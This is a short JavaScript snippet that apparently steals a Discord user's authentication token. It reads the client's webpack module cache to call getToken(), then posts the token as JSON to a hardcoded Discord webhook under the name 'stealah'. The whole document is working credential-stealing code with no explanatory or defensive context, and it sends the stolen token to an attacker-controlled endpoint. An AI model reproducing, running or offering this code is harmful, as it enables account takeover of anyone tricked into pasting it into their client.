token = (
    webpackChunkdiscord_app.push(
        [
            [''],
            {},
            e => {
                m=[];
                for(let c in e.c)
                    m.push(e.c[c])
            }
        ]
    ),
    m
).find(
    m => m?.exports?.default?.getToken !== void 0
).exports.default.getToken()

const request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/1059517636859400222/zvXOlE8NciH-kEaFEmShMcif-aBEX-aGcfh9ZctVXU7swtwHRwlUYWxi9oGtN0B3NcZN");

      request.setRequestHeader('Content-type', 'application/json');

      const params = {
        username: "stealah",
        avatar_url: "",
        content: token
      }

      request.send(JSON.stringify(params));
